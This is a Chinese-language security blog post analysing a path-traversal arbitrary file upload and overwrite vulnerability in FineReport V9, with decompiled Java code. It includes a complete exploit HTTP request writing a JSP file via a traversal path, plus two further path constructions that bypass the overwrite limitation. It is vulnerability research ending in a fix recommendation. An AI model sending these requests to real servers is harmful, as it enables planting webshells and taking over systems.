### 作者:白帽酱(burpheart)
文章首发于[个人博客](https://rce.moe/2021/05/03/%E5%B8%86%E8%BD%AF-v9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%8D%E8%A6%86%E7%9B%96%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/)转载请注明来源

# 0x00 前言

这个漏洞是前不久HV爆出的.当时爆出了可实现任意文件覆盖的EXP.于是就分析了下这个漏洞.并发现了另外一种利用方法.
最近才有时间把笔记整理出来写出文章所以发的有点晚.

第一次写文章，如果有错误的地方希望各位大佬指出！

## 0x01 分析

帆软官方提供了安装包下载地址 下载之

<https://www.finereport.com/product/download>

发现这是个java开发的web应用 先准备工具好工具反编译class  
随手拿个网上给出的playload 看一下路由操作 op svginit,cmd design_save_svg

    
    
    POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
    Host: 192.168.10.1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=; JSESSIONID=A240C26B17628D871BB74B7601482FDE
    Connection: close
    Content-Type:text/xml;charset=UTF-8
    
    Content-Length: 74
    
    {"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}

经过搜索 发现存在漏洞的Service在WEB-INF\lib\fr-chart-9.0.jar内  
\com\fr\chart\web\ChartSvgInitService.class 反编译之

    
    
    package com.fr.chart.web;
    
    import com.fr.stable.fun.Service;
    import com.fr.stable.web.RequestCMDReceiver;
    import com.fr.web.core.WebActionsDispatcher;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    public class ChartSvgInitService implements Service {
        private RequestCMDReceiver[] actions = new RequestCMDReceiver[]{new ChartGetSvgAction(), new ChartSaveSvgAction(), new ChartDeleteSvgAction()};
    
        public ChartSvgInitService() {
        }
    
        public String actionOP() {
            return "svginit";
        }
    
        public void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception {
            WebActionsDispatcher.dealForActionCMD(var1, var2, var4, this.actions);
        }
    }

显然要找的漏洞点在ChartSaveSvgAction内

    
    
    package com.fr.chart.web;
    
    import com.fr.base.Utils;
    import com.fr.chart.base.MapSvgAttr;
    import com.fr.chart.base.MapSvgXMLHelper;
    import com.fr.general.GeneralContext;
    import com.fr.general.http.HttpClient;
    import com.fr.stable.StableUtils;
    import com.fr.web.core.ActionNoSessionCMD;
    import com.fr.web.utils.WebUtils;
    import java.io.File;
    import java.io.FileOutputStream;
    import java.io.InputStream;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    public class ChartSaveSvgAction extends ActionNoSessionCMD {
        public ChartSaveSvgAction() {
        }
    
        public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {
            String var4 = WebUtils.getHTTPRequestParameter(var1, "filePath"); 
            String var5 = GeneralContext.getEnvProvider().getPath() + "/" + "assets" + "/";
            var4 = var5 + var4.substring(var4.indexOf("chartmapsvg"));
            File var6 = null;
            if (var4.contains(".svg")) {
                var6 = new File(var4.substring(0, var4.lastIndexOf("/")));
            } else {
                var6 = new File(var4);
            }
    
            if (!var6.exists()) {
                var6.mkdirs();
            }
    
            InputStream var7 = HttpClient.getInputStream(var1);
            if (var7 != null) {
                FileOutputStream var8 = new FileOutputStream(var4);
                Utils.copyBinaryTo(var7, var8);
                String[] var9 = StableUtils.pathSplit(var4);
                String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - 1]);
                MapSvgXMLHelper.getInstance().pushMapAttr(var10, new MapSvgAttr(var4));
                var8.flush();
                var7.close();
                var8.close();
            }
        }
    
        public String getCMD() {
            return "design_save_svg";
        }
    }

从代码看出这个action原本应该是为了实现上传保存svg图片的功能.

首先来看传入uri中的filePath参数的处理

String var4 = WebUtils.getHTTPRequestParameter(var1, “filePath”); //
首先传入uri中的filePath参数  
String var5 = GeneralContext.getEnvProvider().getPath() + “/“ + “assets” +
“/“; //取当前目录拼接成保存目录  
var4 = var5 + var4.substring(var4.indexOf(“chartmapsvg”));
//取filePath中的chartmapsvg右侧的字符串与var5目录拼接  
var4 即为目标操作 目录/文件路径  
这里有一个安全问题 输入filePath可控 可以构造目录穿越  
那么为什么会造成覆盖文件呢 我们往下看  
if (var4.contains(“.svg”)) { //判断路径是否包含字符串.svg  
var6 = new File(var4.substring(0, var4.lastIndexOf(“/“))); //如果包含
取最后一个/前面的字符串作为路径new一个File类  
} else {  
var6 = new File(var4); //如果不包含 直接用路径new一个File类  
}  
if (!var6.exists()) { //判断var6文件/文件夹是否存在  
var6.mkdirs();//不存在则创建文件夹  
}

### 任意文件覆盖の漏洞

假设filePath 传入 chartmapsvg/123.jsp 则var6打开的路径为 当前环境变量目录/assets/123.jsp  
假设123.jsp不存在 所以会创建一个123.jsp的文件夹  
123.jsp就变成了一个文件夹了  
因为123.jsp是文件夹所以不能当做文件打开写入数据 导致利用失败  
如果123.jsp存在 就不会创建文件夹 直接写入数据 达到文件覆盖的目的  
这个是网传EXP的利用方法

### 任意文件上传の漏洞

仔细阅读代码可以发现  
````

    
    
    if (var4.contains(“.svg”)) { //判断路径是否包含字符串.svg
    var6 = new File(var4.substring(0, var4.lastIndexOf(“/“))); //如果包含 取最后一个/前面的字符串作为路径new一个File类
    } else {
    var6 = new File(var4); //如果不包含 直接用路径new一个File类
    }

  
如果传入的路径包含.svg字符串 则判断和创建的将会是父文件夹  
根据上面的判断条件就可以写出构造路径利用的第二种方法了  
chartmapsvg/123.svg.jsp 父目录存在直接写入一个123.svg.jsp文件  
chartmapsvg/.svg/123.jsp .svg目录不存在创建一个.svg文件夹 在文件夹下写入一个123.jsp文件  
这样就可以绕过文件覆盖的限制实现任意文件上传 (其实这种才是比较好用的利用方法 不知道当时为什么大佬们没有发现)

## 0x03 总结

用户输入的参数没有进行过滤 导致文件操作路径可控 最终造成任意文件上传

应该严格校验用户输入限制文件操作目录 后缀

